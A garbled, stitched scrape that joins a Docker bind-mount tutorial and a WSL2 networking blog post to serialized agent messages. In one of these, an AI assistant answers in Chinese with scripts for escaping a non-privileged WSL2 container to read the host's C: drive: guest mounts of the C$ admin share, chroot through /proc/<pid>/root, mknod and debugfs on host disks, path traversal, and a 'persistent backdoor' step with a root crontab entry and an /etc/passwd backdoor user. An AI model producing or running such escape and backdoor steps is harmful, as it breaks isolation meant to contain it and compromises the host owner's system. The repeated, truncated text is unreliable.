/bin/bashCopy\n```\n\nLet’s break down this command:\n  * _-i -t_ (or _-it_) enables interactive access to the container\n  * _–rm_ removes the container upon exit to free system resources (CPU, memory)\n  * _/path/on/host_ is the path of the directory on the host machine that we want to mount\n  * _/path/in/container_ is the desired path within the container where the directory will be accessible\n  * _image_name_ is the name or ID of the Docker image we want to run\n  * _/bin/bash_ provides a Bash shell within the container\n\n\nImportantly, **if we don’t employ the _–rm_ option, we might need to remove the container manually after exit to free storage space.**\n## 4. Running the Docker Container[](https://www.baeldung.com/linux/docker-mount-host-filesystem#running-the-docker-container)\nTo illustrate, let’s now replace _/path/on/host_ and _/path/in/container_ from the general syntax we saw above with the respective source and target paths for our scenario:\n\n```\n$ docker run -it --rm -v /home/user1/hostpath:/home/cont_path ubuntu /bin/bash\nroot@e8439d98c634:/# Copy\n```\n\nThis command performs several operations:\n  * starts a Docker container with a copy of the [_u_ _buntu_ image](https://hub.docker.com/_/ubuntu)\n  * creates the _/home/cont_path_ directory within the container\n  * maps the _/home/cont_path_ target directory to the _/home/user1/hostpath_ source directory we created earlier\n\n\nOnce the container is up and running, **we can check that the filesystem is properly mounted by navigating to the target directory within the container:**\n\n```\nroot@baeldung:/# cd /home/cont_path\nroot@baeldung:/home/cont_path# Copy\n```\n\nNotably, using the _/home/user1/hostpath_ directory, we can now access any newly generated or modified data under the _/home/cont_path_ directory of the container. Docker also replicates any changes between both paths. So, any change we make in the _/home/cont_path_ directory affects both the host and container systems. To understand, let’s create the subdirectory structure _/home/cont_path/dir1/dir2_ :\n\n```\n# mkdir -p dir1/dir2Copy\n```\n\nAfter exiting the container, let’s check the directory on our host machine to see if our additions are present:\n\n```\n$ ls /home/user1/hostpath/\ndir1\n$ ls ~/hostpath/dir1\ndir2Copy\n```\n\nSignificantly, the mount operation is verified as successful when both the host directory and the container directory have the same content.\n## 5. Using Elevated Privileges[](https://www.baeldung.com/linux/docker-mount-host-filesystem#using-elevated-privileges)\nIn Docker, **we can use the _–privileged_ and _–cap_ flags to mount filesystems within a container.**\nLet’s suppose we want to set up an environment that depends on mounting a [CIFS](https://www.baeldung.com/linux/cifs-samba-smb-force-unmount#cifs-and-samba) share from the host. If we try to do so directly, the container might encounter problems with the default permissions not allowing the mount. However, _–privileged_ and _–cap_ can provide [elevated privileges](https://www.baeldung.com/linux/privileged-container-capabilities) to the container. Thus, it can access host-level resources, including mounting filesystems.\nTo demonstrate, let’s explore how to mount filesystems within a Docker container using the _–privileged_ and _–cap_ options.\n### 5.1. Running the Container With _–privileged_[](https://www.baeldung.com/linux/docker-mount-host-filesystem#1-running-the-container-with---privileged)\nAgain, to grant a container elevated privileges, we’ll run it with the _–privileged_ switch:\n\n```\n$ docker run --privileged -it -v /home/user1/hostpath:/home/cont_path ubuntu /bin/bash\nroot@53d79f0bb259:/#Copy\n```\n\nTo verify, **we can use the _docker inspect_ command with the _–format_ option**. This _docker_ command provides additional data about running containers. Importantly, it can show whether a container runs in privileged mode.\nSo, let’s check if our container is running with elevated rights using the _–format_ flag and the container ID as an argument:\n\n```\n$ docker inspect --format=\'{{.HostConfig.Privileged}}\' 22a2439bb82f\ntrueCopy\n```\n\nIndeed, _true_ means we are in privileged mode. However, for containers not using that mode, the command would print _false._\n### 5.2. Granting Specific Permissions[](https://www.baeldung.com/linux/docker-mount-host-filesystem#2-granting-specific-permissions)\n**To strengthen our control over the capabilities of a container, we can use the _–cap_ flag**. This option goes with either the _-drop_ or the _-add_ suffix to alter the default capabilities of a container in Linux.\nNotably, containers with higher privilege have some default capabilities on filesystems mounted within the container:\n  * _READ_\n  * _WRITE_\n  * _MKNOD_\n\n\nTo illustrate how to use both flags, let’s set up our container to use all capabilities except for _MKNOD_ :\n\n```\n$ docker run --cap-add=ALL --cap-drop=MKNOD -it -v /home/user1/hostpath:/home/cont_path ubuntu /bin/bashCopy\n```\n\nLet’s break down the new flags in the command:\n  * _–cap-add=ALL_ adds all capabilities to the container\n  * _–cap-drop=MKNOD_ removes the _MKNOD_ capability, thus blocking the container from creating special files using [_mknod_](https://man7.org/linux/man-pages/man1/mknod.1.html)\n\n\nIn addition, **to allow the container to carry out some system administration tasks, we can give it the _SYS_ADMIN_ capability**. To do this, we can use _–cap-add=SYS_ADMIN_ :\n\n```\n$ docker run --cap-add=SYS_ADMIN -it -v /home/user1/hostpath:/home/cont_path ubuntu /bin/bashCopy\n```\n\nNotably, the _SYS_ADMIN_ argument provides administrative rights such as [mount privileges](https://www.baeldung.com/linux/mount-file-systems-without-root-privileges) to the container.\n## 6. Mounting Multiple Directories[](https://www.baeldung.com/linux/docker-mount-host-filesystem#mounting-multiple-directories)\nOf course, **we can mount multiple directories by specifying multiple _-v_ flags in the _docker run_ command**. Each _-v_ switch represents a separate mount:\n\n```\n$ docker run -v ~/hostpath/path_A:/home/path_1 -v ~/hostpath/path_B:/home/path_2 image_nameCopy\n```\n\nThis command mounts two directories:\n  * _~/hostpath/path_A_ on the host machine to _/home/path_1_ in the container\n  * _~/hostpath/path_B_ on the host machine to _/home/path_2_ in the container\n\n\nNotably, **we can mount as many directories as we need by adding more _-v_ options.**\nFor successful mounting, the host machine’s filesystem must be accessible while inside the container. Also, to ensure accurate read and write access, we can evaluate the permissions and [ownership of the mounted directories](https://www.baeldung.com/linux/mount-owner). When we run into permissions problems, we may need to change permissions or use [additional setup options](https://www.baeldung.com/linux/mount-user-rights).\nIn general, **we can effortlessly exchange data and resources between the host machine and the container**. This data exchange can be successful through mounting filesystems within Docker containers. In addition, it can increase flexibility and improve the overall functioning of any [containerized](https://www.baeldung.com/cs/virtualization-vs-containerization#containerization) applications.\n## 7. Conclusion[](https://www.baeldung.com/linux/docker-mount-host-filesystem#conclusion)\nIn this article, we saw how to mount a host filesystem on a Docker container. First, we learned how to set up the host machine. Then we used the _-v_ option to mount the filesystem on the Docker container. Further, we mounted a host filesystem on a Docker container with elevated privileges, allowing it to access host-level resources. Finally, we tested the filesystem to confirm that it works properly.\n\n\n![The Baeldung logo](https://www.baeldung.com/linux/wp-content/themes/baeldung/icon/logo.svg)\n#### Categories\n  * ((('system', 'main'), ('system', 'search')), ToolMessage(role='tool', content='\n\n[ Skip to main content ](https://blog.codonomics.com/2026/01/accessing-windows-host-from-wsl2-linux.html#main)\n[ ](https://blog.codonomics.com/)\n#  [ Blog @ Codonomics ](https://blog.codonomics.com/)\nSearch\n###  Search This Blog \n###  Buy @ Amazon \n###  Accessing Windows Host from WSL2 Linux using Hostname \non [ January 31, 2026  ](https://blog.codonomics.com/2026/01/accessing-windows-host-from-wsl2-linux.html "permanent link")\n  * Get link\n  * Facebook\n  * X\n  * Pinterest\n  * Email\n  * Other Apps\n\n\n### Problem Statement\nI have my AI Agent development done in WSL2 Ubuntu environment on my Windows machine. And I have my Ollama running on my Windows host machine for simplicity and better performance with LLM model leveraging the GPU hardware directly on the host machine. The problem however is that my AI Agent in WSL2 can\'t access the Ollama service in Windows host, over http using localhost domain name. \n  \n\nInside WSL2, localhost refers to the WSL2 VM itself, not your Windows host. This is one of the key differences between WSL1 and WSL2 architectures.\n  \n\n### Solution\n#### Option 1: Use Windows Host IP\nThis is exactly what you\'ve been doing—and it\'s the officially recommended approach from Microsoft\n```bash   \n\n# From WSL2, get the Windows host IP\nip route show | grep default | awk \'{print $3}\'\n# Returns something like 172.18.0.1\n``` \nThen in your code you can access the windows host service using its IP got in the above step like below:\n```python   \n\nmodel = Ollama(host="http://172.18.0.1:11434")\n``` \n#### Option 2: Get Windows Host IP on WSL2. Map it to WINHOST DNS in its hosts file. Use that host name for convenience.\nAdd the below script to the end of your .bashrc or .zshrc file in your wsl2.\n-- \nThis file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters. [Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)\n[ Show hidden characters ](https://blog.codonomics.com/2026/01/{{%20revealButtonHref%20}})  \n|   | ### Check out detailed blog post at https://blog.codonomics.com/2026/01/accessing-windows-host-from-wsl2-linux.html   |  \n| --- | --- |  \n|   | ### Start: Adding Windows Host IP to WSL2 Hosts File  |  \n|   | # Add to the end of ~/.bashrc or ~/.zshrc  |  \n|   |  echo "Updating Windows host IP in /etc/hosts..."  |  \n|   |   |  \n|   | # Get Windows IP from default route  |  \n|   | WIN_HOST_IP=$(ip route show | grep -i default | awk \'{print $3}\')  |  \n|   |   |  \n|   | # Check if we got a valid IP  |  \n|   |  if [ -n "$WIN_HOST_IP" ]; then  |  \n|   |  # Remove any existing entry for winhost  |  \n|   |  sudo sed -i \'/winhost/d\' /etc/hosts  |  \n|   |   |  \n|   |  # Add new entry  |  \n|   |  echo "$WIN_HOST_IP winhost" | sudo tee -a /etc/hosts > /dev/null  |  \n|   |   |  \n|   |  echo "✓ winhost → $WIN_HOST_IP"  |  \n|   | else  |  \n|   |  echo "✗ Failed to get Windows host IP"  |  \n|   | fi  |  \n|   | ### End: Adding Windows Host IP to WSL2 Hosts File  |  \n[view raw](https://gist.github.com/karthiks/eb823570f8bce4a16957a70237df6d78/raw/3a1e941846769db4887818cf9dea674faacba100/wsl2winhost.sh) [ wsl2winhost.sh ](https://gist.github.com/karthiks/eb823570f8bce4a16957a70237df6d78#file-wsl2winhost-sh) hosted with ❤ by [GitHub](https://github.com)\n-- \nThen save the file and reload your terminal by running the command below:  \n`source .zshrc` \n  \n\nYou can now access the windows service in your python code like below:   \n```python   \n\nmodel = Ollama(host="http://winhost:11434")\n``` \n  \n\n[ ((('system', 'main'), ('system', 'search')), AssistantMessage(role='assistant', content='根据您提供的信息（WSL2 Docker容器，仅D盘挂载到/workspace，具备cap_dac_override、cap_sys_chroot、cap_mknod能力，非特权容器，无Docker socket），以下是几种从容器内访问Windows宿主机C盘的具体技术方案：\n\n## 方案一：通过SMB/CIFS网络挂载（推荐）\n这是最直接的方法，利用WSL2内置的网络桥接功能。\n\n### 步骤：\n```bash\n# 1. 获取Windows宿主机的IP地址\n# 在容器内执行：\nWIN_IP=$(ip route show | grep default | awk \'{print $3}\')\necho "Windows主机IP: $WIN_IP"\n\n# 2. 安装CIFS工具（如未安装）\napt-get update && apt-get install -y cifs-utils\n\n# 3. 创建挂载点\nmkdir -p /mnt/win_c\n\n# 4. 尝试挂载C盘（多种身份验证方式）\n# 方式A：尝试匿名访问（如果Windows允许）\nmount -t cifs //$WIN_IP/c$ /mnt/win_c -o guest,uid=0,gid=0 2>/dev/null\n\n# 方式B：使用当前Windows用户凭据（WSL2自动传递）\n# 获取当前WSL用户名（通常与Windows用户名相同）\nWIN_USER=$(whoami)\nmount -t cifs //$WIN_IP/c$ /mnt/win_c -o user=$WIN_USER,uid=0,gid=0 2>/dev/null\n\n# 方式C：指定用户名（可能需要密码）\n# mount -t cifs //$WIN_IP/c$ /mnt/win_c -o username=YourWindowsUser,password=YourPassword,uid=0,gid=0\n\n# 5. 验证挂载\nif mount | grep -q /mnt/win_c; then\n    echo "挂载成功！"\n    ls -la /mnt/win_c/\nelse\n    echo "挂载失败，尝试使用smbclient测试连接"\n    apt-get install -y smbclient\n    smbclient -L //$WIN_IP -U $WIN_USER\nfi\n```\n\n### 注意事项：\n- Windows默认可能禁用匿名SMB访问，需要启用：`控制面板 > 程序 > 启用或关闭Windows功能 > 启用SMB 1.0/CIFS文件共享支持`\n- 或使用PowerShell启用：`Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`\n- 防火墙可能需要放行：`New-NetFirewallRule -DisplayName "SMB Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow`\n\n## 方案二：利用cap_sys_chroot能力进行文件系统逃逸\n如果SMB挂载失败，可利用容器的capabilities尝试访问宿主机文件系统。\n\n### 步骤：\n```bash\n# 1. 寻找宿主机文件系统挂载点\n# 查看容器内所有挂载信息\ncat /proc/mounts | grep -E \'/dev/sd|/dev/vd|/dev/xvd\'\n\n# 2. 尝试访问WSL2虚拟机的文件系统\n# 在WSL2中，Windows C盘通常挂载在/mnt/c\n# 但容器内可能看不到，需要先找到WSL2虚拟机的根文件系统\n\n# 3. 通过/proc文件系统寻找宿主进程\n# 查找可能属于宿主的进程\nls -la /proc/ | grep -E \'^d\' | awk \'{print $9}\' | while read pid; do\n    if [ -d "/proc/$pid/root/mnt/c" ]; then\n        echo "找到宿主机进程: $pid"\n        # 使用cap_sys_chroot能力切换根目录\n        chroot /proc/$pid/root /bin/bash -c "ls /mnt/c"\n        break\n    fi\ndone 2>/dev/null\n\n# 4. 创建设备节点并挂载（需要cap_mknod）\n# 查找可能的磁盘设备\nls -la /dev/sd* /dev/vd* 2>/dev/null\n\n# 如果有磁盘设备，尝试创建设备节点\nmknod /dev/sdb1 b 8 17 2>/dev/null  # 根据实际情况调整主次设备号\n\n# 5. 使用debugfs直接读取文件系统（无需挂载）\napt-get install -y e2fsprogs\ndebugfs /dev/sda1  # 假设/dev/sda1是宿主机磁盘\n# 在debugfs提示符下：\n#  ls /mnt/c\n#  cat /mnt/c/Windows/System32/drivers/etc/hosts\n```\n\n## 方案三：利用D盘挂载点进行路径穿越\n如果D盘是通过绑定挂载（bind mount）方式挂载到/workspace，可能可以访问父目录。\n\n```bash\n# 1. 检查D盘挂载方式\nmount | grep workspace\n\n# 2. 如果是绑定挂载，尝试访问父目录\n# 例如，如果显示：/mnt/d on /workspace type ...\n# 则可以尝试：\nls -la /workspace/../c 2>/dev/null\n\n# 3. 使用realpath解析路径\nrealpath /workspace/.. 2>/dev/null\n\n# 4. 尝试使用符号链接\nln -s /workspace /tmp/drive_d\ncd /tmp/drive_d/../c 2>/dev/null && pwd\n```\n\n## 方案四：利用WSL2特殊文件系统\nWSL2提供了一些特殊的文件系统路径，可能包含宿主信息。\n\n```bash\n# 1. 检查WSL2特有路径\nls -la /mnt/ 2>/dev/null\nls -la /run/ 2>/dev/null\n\n# 2. 查找Docker Desktop相关socket（即使没有docker.sock）\nfind /run /var/run -name "*.sock" 2>/dev/null | xargs -I {} sh -c \'echo "检查 {}:"; curl --unix-socket {} http://localhost/info 2>/dev/null | head -5\'\n\n# 3. 检查WSL2的/proc/sys/fs/binfmt_misc\ncat /proc/sys/fs/binfmt_misc/WSLInterop 2>/dev/null\n\n# 4. 通过WSL2的互操作功能\n# 如果WSL2互操作已启用，可以直接执行Windows命令\n/bin/wsl.exe -d docker-desktop cat /mnt/c/Windows/System32/drivers/etc/hosts 2>/dev/null\n```\n\n## 方案五：组合利用capabilities创建持久化访问\n如果上述方法都失败，可以尝试创建持久化后门。\n\n```bash\n# 1. 在D盘（/workspace）创建脚本，等待WSL2执行\ncat > /workspace/escape.sh << \'EOF\'\n#!/bin/bash\n# 这个脚本将在WSL2中执行，可以访问/mnt/c\ncp /mnt/c/Windows/System32/calc.exe /workspace/calc.exe 2>/dev/null\necho "访问C盘成功" > /workspace/proof.txt\nEOF\nchmod +x /workspace/escape.sh\n\n# 2. 利用cap_dac_override修改系统文件\n# 尝试修改/etc/passwd或/etc/shadow添加后门用户\n# 注意：这需要容器内是root用户且文件可写\n\n# 3. 创建定时任务\necho "* * * * * root /bin/bash -c \'ls /mnt/c > /tmp/c_contents.txt 2>&1\'" >> /etc/crontab 2>/dev/null\n```\n\n## 自动化检测脚本\n将以下脚本保存为`check_escape.sh`并在容器内执行：\n\n```bash\n#!/bin/bash\necho "=== WSL2 Docker容器逃逸检测 ==="\necho "1. 能力检测:"\ncapsh --print 2>/dev/null | grep -E "cap_sys_chroot|cap_dac_override|cap_mknod"\n\necho "2. 网络检测:"\nWIN_IP=$(ip route show | grep default | awk \'{print $3}\' 2>/dev/null)\necho "Windows主机IP: $WIN_IP"\nping -c 1 $WIN_IP 2>&1 | grep -E "bytes from|unreachable"\n\necho "3. 文件系统检测:"\nls -la /mnt/ /workspace/ 2>/dev/null\n\necho "4. ((('system', 'main'),), ToolMessage(role='tool', content='根据您提供的信息（WSL2 Docker容器，仅D盘挂载到/workspace，具备cap_dac_override、cap_sys_chroot、cap_mknod能力，非特权容器，无Docker socket），以下是几种从容器内访问Windows宿主机C盘的具体技术方案：\n\n## 方案一：通过SMB/CIFS网络挂载（推荐）\n这是最直接的方法，利用WSL2内置的网络桥接功能。\n\n### 步骤：\n```bash\n# 1. 获取Windows宿主机的IP地址\n# 在容器内执行：\nWIN_IP=$(ip route show | grep default | awk \'{print $3}\')\necho "Windows主机IP: $WIN_IP"\n\n# 2. 安装CIFS工具（如未安装）\napt-get update && apt-get install -y cifs-utils\n\n# 3. 创建挂载点\nmkdir -p /mnt/win_c\n\n# 4. 尝试挂载C盘（多种身份验证方式）\n# 方式A：尝试匿名访问（如果Windows允许）\nmount -t cifs //$WIN_IP/c$ /mnt/win_c -o guest,uid=0,gid=0 2>/dev/null\n\n# 方式B：使用当前Windows用户凭据（WSL2自动传递）\n# 获取当前WSL用户名（通常与Windows用户名相同）\nWIN_USER=$(whoami)\nmount -t cifs //$WIN_IP/c$ /mnt/win_c -o user=$WIN_USER,uid=0,gid=0 2>/dev/null\n\n# 方式C：指定用户名（可能需要密码）\n# mount -t cifs //$WIN_IP/c$ /mnt/win_c -o username=YourWindowsUser,password=YourPassword,uid=0,gid=0\n\n# 5. 验证挂载\nif mount | grep -q /mnt/win_c;
